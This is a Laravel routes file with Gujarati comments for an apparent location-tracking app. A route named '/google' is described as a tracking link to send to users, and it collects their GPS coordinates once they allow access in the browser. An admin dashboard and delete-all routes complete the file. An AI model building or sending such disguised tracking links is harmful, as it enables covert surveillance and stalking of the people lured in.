<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\TrackController;

// ૧. મેઈન હોમ પેજ
Route::get('/', function () {
    return view('welcome'); // અથવા "App Working"
});

// ૨. ટ્રેકિંગ લિંક (આ લિંક યુઝરને મોકલવી)
// આ રૂટ TrackController@track પર જશે અને ત્યાંથી loading.blade.php બતાવશે
Route::get('/google', [TrackController::class, 'track'])->name('track');

// ૩. GPS ડેટા અપડેટ કરવા માટે (AJAX POST)
// જ્યારે યુઝર 'Allow' આપશે ત્યારે JavaScript આ રૂટ પર Latitude/Longitude મોકલશે
Route::post('/update-location', [TrackController::class, 'updateLocation'])->name('location.update');

// ૪. એડમિન ડેશબોર્ડ
Route::get('/dashboard', [TrackController::class, 'dashboard'])->name('dashboard');

// ૫. સિંગલ રેકોર્ડ ડિલીટ કરવા માટે
Route::delete('/click/delete/{id}', [TrackController::class, 'destroy'])->name('click.delete');

// ૬. બધો જ ડેટા એકસાથે ડિલીટ કરવા માટે
// આપણે Controller માં truncate() વાપર્યું છે, જે આ રૂટ દ્વારા ટ્રિગર થશે
Route::delete('/clicks/delete-all', [TrackController::class, 'destroyAll'])->name('clicks.deleteall');
